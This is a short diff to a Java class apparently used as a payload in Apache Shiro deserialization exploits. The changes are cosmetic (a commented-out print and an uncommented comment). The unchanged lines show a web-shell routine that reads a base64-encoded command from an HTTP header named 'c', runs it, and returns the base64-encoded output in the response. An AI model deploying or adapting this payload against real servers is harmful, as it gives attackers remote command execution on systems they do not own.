@@ -27,6 +27,8 @@ public class Shiro_linux extends AbstractTranslet implements Serializable {
             HttpServletRequest httprequest = ((ServletRequestAttributes) requestAttributes).getRequest();
             HttpServletResponse httpresponse = ((ServletRequestAttributes) requestAttributes).getResponse();
 
+//            System.out.println("11111");
+
             // exexute shell to base64
             String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getHeader("c")));
 
@@ -37,7 +39,7 @@ public class Shiro_linux extends AbstractTranslet implements Serializable {
             Scanner scan = new Scanner(in).useDelimiter("\\A");
             String d = scan.hasNext() ? scan.next() : "";
 
-//            // return command result to base64
+            // return command result to base64
             String base64Str = "";
             base64Str = DatatypeConverter.printBase64Binary(d.getBytes());
             httpresponse.getWriter().write(base64Str);
